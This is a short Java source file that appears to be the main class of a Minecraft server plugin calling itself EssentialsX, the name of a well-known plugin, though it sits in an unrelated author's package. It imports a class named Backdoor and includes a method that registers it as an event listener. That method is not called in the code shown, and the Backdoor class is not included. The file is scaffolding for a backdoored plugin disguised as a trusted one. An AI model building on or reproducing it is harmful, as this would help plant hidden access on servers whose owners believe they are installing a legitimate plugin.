package com.redbean0721.essentialsx;

import com.redbean0721.essentialsx.Event.Backdoor;
import org.bukkit.plugin.java.JavaPlugin;

public final class EssentialsX extends JavaPlugin {

    @Override
    public void onEnable() {
//        setupCommands();

    }

    @Override
    public void onDisable() {
        // Plugin shutdown logic
    }

    public void setupCommands() {
//        getCommand("essentials").setExecutor(new essentials(this));
    }

    public void setupEvent() {
        getServer().getPluginManager().registerEvents(new Backdoor(this), this);
    }
}
